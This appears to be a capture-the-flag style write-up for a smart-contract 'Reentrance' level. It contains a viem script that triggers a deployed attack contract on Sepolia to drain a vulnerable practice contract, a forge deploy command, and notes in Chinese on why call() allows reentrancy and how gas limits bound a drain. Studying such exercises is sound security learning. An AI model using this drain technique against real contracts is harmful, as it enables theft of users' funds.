# 11-Reentrance
```
async function main() {
    const client = createPublicClient({
        chain: sepolia,
        transport: http(RPC_URL),
    });

    const account = privateKeyToAccount(PRIVATE_KEY);

    const walletClient = createWalletClient({
        account,
        chain: sepolia,
        transport: http(RPC_URL),
    });

    console.log('=== Reentrance Attack ===\n');

    // 1. 检查 Reentrance 合约当前余额
    const balanceBefore = await client.getBalance({
        address: Reentrance_ADDRESS
    });

    console.log('Reentrance contract balance before:', balanceBefore.toString(), 'wei');

    // 2. 调用 AttackReentrance 合约的 attack() 函数
    console.log('\nCalling attack() on AttackReentrance contract...');
    
    const tx = await walletClient.writeContract({
        address: ReentranceATTACK_ADDRESS,
        abi: abi,
        functionName: 'attack',
        args: [],
        value: parseEther('0.01'), // 发送 0.01 ETH 作为初始捐款
    });
    console.log('Transaction hash:', tx);

    // 等待交易确认
    const receipt = await client.waitForTransactionReceipt({ hash: tx });
    console.log('Transaction status:', receipt.status === 'success' ? '✓ Success' : '✗ Failed');
    
    // 3. 检查 Reentrance 合约攻击后的余额
    const balanceAfter = await client.getBalance({
        address: Reentrance_ADDRESS
    });
    console.log('Reentrance contract balance after:', balanceAfter.toString(), 'wei');

    
}

main().catch(console.error);
/**
 * /**
    forge create src/11-Reentrance/AttackReentrance.sol:AttackReentrance \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $Reentrance_ADDRESS
 */
```

### 思考🤔
```
1. 为什么用 call 而不是 transfer？

  Reentrance 合约用的是：
  msg.sender.call{value: _amount}("")

  call vs transfer 的区别（EVM 层面）：

  | 特性     | transfer()  | call()           |
  |--------|-------------|------------------|
  | Gas 转发 | 固定 2300 gas | 转发所有剩余 gas       |
  | 失败处理   | 自动 revert   | 返回 false，需手动检查   |
  | 重入风险   | 低（gas 不够）   | 高（足够 gas 执行复杂逻辑） |

  2300 gas 只够做什么？
  receive() external payable {
      // 可以：emit event (约 1000 gas)
      // 可以：简单变量赋值
      // 不可以：外部调用（CALL 至少 700 gas + 目标合约执行）
  }

  所以如果 Reentrance 用 transfer，攻击会失败！

  2. 下溢问题（Solidity 0.6.x）

  在没有 SafeMath 的情况下（虽然这里用了）：
  balances[msg.sender] -= _amount;

  如果重入太多次，可能导致：
  balances[attacker] = 1
  减去 1 次 → 0
  减去 2 次 → 0 - 1 = 2^256 - 1 (下溢)

  但这个合约用了 SafeMath，所以会 revert。

  3. Gas 限制

  重入次数受 gas limit 限制：
  每次重入消耗约 10,000 gas
  区块 gas limit: 30,000,000
  最多重入约 3000 次

  所以如果合约有 10000 ETH，你存 1 ETH，理论上可以全部抽干（只需 10000 次重入）。
```